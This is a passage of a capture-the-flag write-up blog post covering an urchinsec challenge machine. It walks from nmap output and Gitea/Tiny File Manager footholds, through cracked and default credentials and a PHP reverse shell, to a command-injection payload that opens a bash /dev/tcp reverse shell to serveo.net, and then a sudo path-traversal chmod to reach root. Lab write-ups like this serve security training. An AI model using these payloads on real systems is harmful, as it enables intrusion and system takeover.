+</span></span><span class="line"><span class="cl">SF:&#34;)%r(Help,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
+</span></span><span class="line"><span class="cl">SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
+</span></span><span class="line"><span class="cl">SF:0Request&#34;)%r(SSLSessionReq,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
+</span></span><span class="line"><span class="cl">SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
+</span></span><span class="line"><span class="cl">SF:\r\n400\x20Bad\x20Request&#34;)%r(TerminalServerCookie,67,&#34;HTTP/1\.1\x20400
+</span></span><span class="line"><span class="cl">SF:\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
+</span></span><span class="line"><span class="cl">SF:Connection:\x20close\r\n\r\n400\x20Bad\x20Request&#34;)%r(TLSSessionReq,67,
+</span></span><span class="line"><span class="cl">SF:&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20
+</span></span><span class="line"><span class="cl">SF:charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&#34;)%r(
+</span></span><span class="line"><span class="cl">SF:Kerberos,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
+</span></span><span class="line"><span class="cl">SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
+</span></span><span class="line"><span class="cl">SF:Request&#34;)%r(LPDString,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent
+</span></span><span class="line"><span class="cl">SF:-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n4
+</span></span><span class="line"><span class="cl">SF:00\x20Bad\x20Request&#34;)%r(LDAPSearchReq,67,&#34;HTTP/1\.1\x20400\x20Bad\x20R
+</span></span><span class="line"><span class="cl">SF:equest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
+</span></span><span class="line"><span class="cl">SF:x20close\r\n\r\n400\x20Bad\x20Request&#34;)%r(SIPOptions,67,&#34;HTTP/1\.1\x204
+</span></span><span class="line"><span class="cl">SF:00\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r
+</span></span><span class="line"><span class="cl">SF:\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&#34;);
+</span></span><span class="line"><span class="cl">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+</span></span><span class="line"><span class="cl">SF-Port3000-TCP:V=7.94SVN%I=7%D=4/27%Time=662CEC51%P=x86_64-pc-linux-gnu%r
+</span></span><span class="line"><span class="cl">SF:(GenericLines,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
+</span></span><span class="line"><span class="cl">SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
+</span></span><span class="line"><span class="cl">SF:d\x20Request&#34;)%r(GetRequest,38A1,&#34;HTTP/1\.0\x20200\x20OK\r\nCache-Contr
+</span></span><span class="line"><span class="cl">SF:ol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCo
+</span></span><span class="line"><span class="cl">SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_git
+</span></span><span class="line"><span class="cl">SF:ea=7748aed9b1afa3fe;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Coo
+</span></span><span class="line"><span class="cl">SF:kie:\x20_csrf=U5NJcsVjX-xLNIhZ6o64wSWiZd86MTcxNDIyMDExMzY5MDg3MDY4Nw;\x
+</span></span><span class="line"><span class="cl">SF:20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Opt
+</span></span><span class="line"><span class="cl">SF:ions:\x20SAMEORIGIN\r\nDate:\x20Sat,\x2027\x20Apr\x202024\x2012:15:13\x
+</span></span><span class="line"><span class="cl">SF:20GMT\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\&#34;en-US\&#34;\x20data-theme=
+</span></span><span class="line"><span class="cl">SF:\&#34;gitea-auto\&#34;&gt;\n&lt;head&gt;\n\t&lt;meta\x20name=\&#34;viewport\&#34;\x20content=\&#34;widt
+</span></span><span class="line"><span class="cl">SF:h=device-width,\x20initial-scale=1\&#34;&gt;\n\t&lt;title&gt;Gitea:\x20Git\x20with\x
+</span></span><span class="line"><span class="cl">SF:20a\x20cup\x20of\x20tea&lt;/title&gt;\n\t&lt;link\x20rel=\&#34;manifest\&#34;\x20href=\&#34;
+</span></span><span class="line"><span class="cl">SF:data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG
+</span></span><span class="line"><span class="cl">SF:9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic
+</span></span><span class="line"><span class="cl">SF:3RhcnRfdXJsIjoiaHR0cDovL2dpdC5iaWxsc3lzLnVyYy8iLCJpY29ucyI6W3sic3JjIjoi
+</span></span><span class="line"><span class="cl">SF:aHR0cDovL2dpdC5iaWxsc3lzLnVyYy9hc3NldHMvaW1nL2xvZ28ucG5nIiwidHlwZSI6Iml
+</span></span><span class="line"><span class="cl">SF:tYWdlL3BuZyIsInNpem&#34;)%r(Help,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\n
+</span></span><span class="line"><span class="cl">SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r
+</span></span><span class="line"><span class="cl">SF:\n\r\n400\x20Bad\x20Request&#34;)%r(HTTPOptions,197,&#34;HTTP/1\.0\x20405\x20Me
+</span></span><span class="line"><span class="cl">SF:thod\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Cont
+</span></span><span class="line"><span class="cl">SF:rol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nS
+</span></span><span class="line"><span class="cl">SF:et-Cookie:\x20i_like_gitea=e41496a78b8b88ad;\x20Path=/;\x20HttpOnly;\x2
+</span></span><span class="line"><span class="cl">SF:0SameSite=Lax\r\nSet-Cookie:\x20_csrf=vUtLqCC5_VSGwBmhopYmXC6PyWM6MTcxN
+</span></span><span class="line"><span class="cl">SF:DIyMDEyMDUyMzg0MjU2Mw;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20Sam
+</span></span><span class="line"><span class="cl">SF:eSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Sat,\x2027\x20A
+</span></span><span class="line"><span class="cl">SF:pr\x202024\x2012:15:20\x20GMT\r\nContent-Length:\x200\r\n\r\n&#34;)%r(RTSPR
+</span></span><span class="line"><span class="cl">SF:equest,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
+</span></span><span class="line"><span class="cl">SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
+</span></span><span class="line"><span class="cl">SF:quest&#34;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Only ports of interest were 22, 25 , 80 , 3306</p>
+<p>on port 80 is bills portfolio other than that there is nothing interesting</p>
+<p><img src="/"
+	
+	
+	
+	loading="lazy"
+	
+		alt="portfoilio"
+	
+	
+></p>
+<p>so we try and get the subdomains:</p>
+<p>There are two subdomains :</p>
+<ul>
+<li>git.billsys.urc  - this is running a local instance of gittea</li>
+<li>storage.billsys.urc - this is running am instance of tiny file manager</li>
+</ul>
+<hr>
+<p>On git.billsys.urc  we create an account and login. There are other users and repos but the one that sticks out is that of bill.</p>
+<p><img src="/images/urchinsec/gittea.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="gittea"
+	
+	
+></p>
+<p>It is source code for a python web app called sesame.</p>
+<p>Looking at the commits we see a sqllite instance database that had been ommited we download it and view contents</p>
+<p><img src="/images/urchinsec/keys.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="keys"
+	
+	
+></p>
+<p><img src="/images/urchinsec/users.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="users"
+	
+	
+></p>
+<p>cracking the user hash we get the password</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f : password123
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<p>On storage.billsys.urc we are provided with an instance of tiny file manager we also require creds to access it. *</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin : admin@123
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Here we can upload files , so i upload a php rev shell</p>
+<hr>
+<p>Dropping to the shell we see that we are user &ldquo;http&rdquo;. There is no obvious method of priv esc.</p>
+<p>I was stuck here till i checked the open ports on the machine using netstat.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Active Internet connections (only servers)
+</span></span><span class="line"><span class="cl">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
+</span></span><span class="line"><span class="cl">tcp        0      0 0.0.0.0:5355            0.0.0.0:*               LISTEN      -                   
+</span></span><span class="line"><span class="cl">tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -                   
+</span></span><span class="line"><span class="cl">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+</span></span><span class="line"><span class="cl">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      38132/python3       
+</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+</span></span><span class="line"><span class="cl">tcp6       0      0 :::5355                 :::*                    LISTEN      -                   
+</span></span><span class="line"><span class="cl">tcp6       0      0 :::3306                 :::*                    LISTEN      -                   
+</span></span><span class="line"><span class="cl">tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+</span></span><span class="line"><span class="cl">tcp6       0      0 :::3000                 :::*                    LISTEN      -                   
+</span></span><span class="line"><span class="cl">tcp6       0      0 :::3333                 :::*                    LISTEN      - 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As you see above there is a service on port 80 that is only accessed internally.</p>
+<p>To access this from our attack box we will need to use a tunnel client like chisel. You can get chisel &raquo; <a class="link" href="https://github.com/jpillora/chisel"  target="_blank" rel="noopener"
+    >here</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">on attackbox &gt;&gt; ./chisel server -p 8000 --reverse
+</span></span><span class="line"><span class="cl">on chal machine  &gt;&gt; ./chisel client &lt;ip&gt;:8000 R:8001:127.0.0.1:8080
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After this we can access the service on port 80 which is the sesame application we got the src earlier.</p>
+<hr>
+<p>On the sesame applicatiion we login with the creds we found in the sqlite db file.</p>
+<p>If you read the src this application is used by bill to read files in the server.</p>
+<p>There is nothing else interesting so i looked through the source code.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">in main.py
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def dashboard():
+</span></span><span class="line"><span class="cl">    if request.method == &#34;GET&#34;:
+</span></span><span class="line"><span class="cl">        return render_template(&#39;dash.html&#39;)
+</span></span><span class="line"><span class="cl">    if request.method == &#34;POST&#34;:
+</span></span><span class="line"><span class="cl">        key = request.form.get(&#34;key&#34;)
+</span></span><span class="line"><span class="cl">        file_read = request.form.get(&#34;fileread&#34;)
+</span></span><span class="line"><span class="cl">        check_key = SesameKey.query.filter_by(key=key).first()
+</span></span><span class="line"><span class="cl">        if check_key is not None:
+</span></span><span class="line"><span class="cl">            num = 107
+</span></span><span class="line"><span class="cl">            stk = chr(num)
+</span></span><span class="line"><span class="cl">            secret = &#39;&#39;.join([chr(ord(x) ^ ord(stk)) for x in key])
+</span></span><span class="line"><span class="cl">            with open(&#34;temp_secret&#34;, &#34;w&#34;) as temp:
+</span></span><span class="line"><span class="cl">                temp.write(secret)
+</span></span><span class="line"><span class="cl">            command = f&#34;sudo sesame -i temp_secret -r {file_read}&#34;
+</span></span><span class="line"><span class="cl">            run = subprocess.check_output(command, shell=True)
+</span></span><span class="line"><span class="cl">            run = run.decode(&#39;utf-8&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            os.system(f&#34;rm -rf temp_secret&#34;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            return render_template(&#39;dash.html&#39;, message=&#34;It Works&#34;)
+</span></span><span class="line"><span class="cl">        else:
+</span></span><span class="line"><span class="cl">            return render_template(&#39;dash.html&#39;, message=&#34;Wrong Key&#34;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If you look carefully our user input is not being sanitized and it is being put directly to subprocess module. Seeing this you immediately think command execution.</p>
+<p>The catch is that the output of a command you run will not be displayed.</p>
+<p>So after some trial i created:</p>
+<p><img src="/images/urchinsec/cmd.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="cmd"
+	
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">key=IpwnEazy@@#TH!ngG5~&amp;fileread=/etc/passwd; bash -c &#34;bash -i &gt;&amp; /dev/tcp/serveo.net/33997 0&gt;&amp;1&#34;&amp;action=
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This gets  us  a reverse shell. We are now the user bill. From here i created ssh keys so that i could login via ssh which is better and more stable.</p>
+<p><img src="/images/urchinsec/ssh.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="ssh"
+	
+	
+></p>
+<hr>
+<p>Our target now us to achieve root.</p>
+<p>Running sudo -l we can see that our user can run &ldquo;sesame&rdquo; command with sudo rights.</p>
+<p>This command is used earlier in the python application</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Running : sudo sesame -i temp_secret -r /etc/shadow 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Note: shadow file is only read by root so with this  command we can read files as the root user.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/urchinsec/shadoww.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="shadow"
+	
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Error: -i is a required argument
+</span></span><span class="line"><span class="cl">Usage of sesame:
+</span></span><span class="line"><span class="cl">  -h	Prints This Output
+</span></span><span class="line"><span class="cl">  -i string
+</span></span><span class="line"><span class="cl">    	Input Secret File To Read Secret (-i /path/to/secret.txt)
+</span></span><span class="line"><span class="cl">  -r string
+</span></span><span class="line"><span class="cl">    	File To Read (-r /path/to/filetoread.txt)
+</span></span><span class="line"><span class="cl">  -s	Change Permissions Of Files
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It also supports changing of file permissions with -s flag.</p>
+<p>SO in order to read the root flag we can exploit this. So after some trial and error i did this</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-zed" data-lang="zed"><span class="line"><span class="cl"><span class="n">sudo</span><span class="w"> </span><span class="n">sesame</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="n">temp_secret</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">When</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">prompts</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="n">enter</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="nn">root/</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">When</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">prompts</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="kd">permission</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">777</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>This above will make the root permission be rwx by everyone.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">. (dot): This refers to the current directory. For example, if you&#39;re in the directory /home/user, then . refers to /home/user.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>From here you can read the root flag</p>
+<p>flag : urchinsec{I_know_CTF_This_S3rV35_IS_we334akK_NEXTTTT}</p>
+<hr>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/htb_cyberapocalypse_2024/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/cover/ca2024.png" loading="lazy" data-key="" data-hash="/cover/ca2024.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB_cyberapocalypse_2024</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/knightctf_2024/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/cover/knightctf.jpg" loading="lazy" data-key="" data-hash="/cover/knightctf.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Knightctf_2024</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/irisctf_whats_my_password/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/cover/iris.png" loading="lazy" data-key="" data-hash="/cover/iris.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Irisctf_whats_my_password</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hack_the_boo2023/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/cover/htb.svg" loading="lazy" data-key="" data-hash="/cover/htb.svg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Hack_the_boo2023</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/blackhat_mea_2023/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/cover/bh.png" loading="lazy" data-key="" data-hash="/cover/bh.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Blackhat_mea_2023</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script
+    src="https://giscus.app/client.js"
+    data-repo="f0rk3b0mb/f0rk3b0mb.github.io"
+    data-repo-id="R_kgDOJkJRlQ"
+    data-category="General"
+    data-category-id="DIC_kwDOJkJRlc4CbrS7"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="top"
+    data-theme="1"
+    data-lang="en"
+    crossorigin="anonymous"
+    async
+></script>
+<script>
+    function setGiscusTheme(theme) {
+        let giscus = document.querySelector("iframe.giscus-frame");
+        if (giscus) {
+            giscus.contentWindow.postMessage(
+                {
+                    giscus: {
+                        setConfig: {
+                            theme: theme,
+                        },
+                    },
+                },
+                "https://giscus.app"
+            );
+        }
+    }
+
+    (function () {
+        addEventListener("message", (e) => {
+            if (event.origin !== "https://giscus.app") return;
+            handler();
+        });
+        window.addEventListener("onColorSchemeChange", handler);
+
+        function handler() {
+            if (document.documentElement.dataset.scheme === "light") {
+                setGiscusTheme('1');
+            } else {
+                setGiscusTheme('dark_dimmed');
+            }
+        }
+    })();
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2023 - 
+        
+        2024 f0rk3b0mb
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.21.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
